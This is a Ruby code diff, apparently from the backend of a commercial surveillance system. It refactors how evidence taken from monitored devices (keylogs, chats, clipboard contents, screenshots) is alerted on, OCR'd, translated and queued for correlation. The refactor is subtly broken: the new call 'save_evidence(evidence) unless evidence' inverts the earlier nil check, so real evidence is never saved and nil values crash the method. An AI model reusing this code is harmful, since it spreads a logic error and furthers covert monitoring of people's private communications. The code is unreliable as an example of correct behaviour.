@@ -173,21 +173,7 @@ class InstanceWorker
                 ev_type = ev[:type]
 
                 evidence_id, index = processor.feed(ev, @agent, @target) do |evidence|
-                  # check if there are matching alerts for this evidence
-                  RCS::DB::Alerting.new_evidence(evidence) unless evidence.nil?
-
-                  # forward the evidence to connectors (if any)
-                  RCS::DB::Connectors.new_evidence(evidence) unless evidence.nil?
-
-                  # add to the ocr processor queue
-                  if $license['ocr']
-                    OCRQueue.add(@target._id, evidence._id) if evidence and evidence.type == 'screenshot'
-                  end
-
-                  # add to the translation queue
-                  if $license['translate']
-                    TransQueue.add(@target._id, evidence._id) if evidence and ['keylog', 'chat', 'clipboard', 'message'].include? evidence.type
-                  end
+                  save_evidence(evidence) unless evidence
                 end
 
               rescue InvalidAgentTarget => e
@@ -231,6 +217,29 @@ class InstanceWorker
     end
 
     EM.defer @process
+  end
+
+  def save_evidence(evidence)
+    # check if there are matching alerts for this evidence
+    RCS::DB::Alerting.new_evidence(evidence)
+
+    # forward the evidence to connectors (if any)
+    RCS::DB::Connectors.new_evidence(evidence)
+
+    # add to the ocr processor queue
+    if $license['ocr']
+      OCRQueue.add(@target._id, evidence._id) if evidence.type == 'screenshot'
+    end
+
+    # add to the translation queue
+    if $license['translate']
+      TransQueue.add(@target._id, evidence._id) if ['keylog', 'chat', 'clipboard', 'message'].include? evidence.type
+    end
+
+    # add to the aggregator queue
+    if $license['correlation']
+      AggregatorQueue.add(@target._id, evidence._id, evidence.type)
+    end
   end
 
   def resume
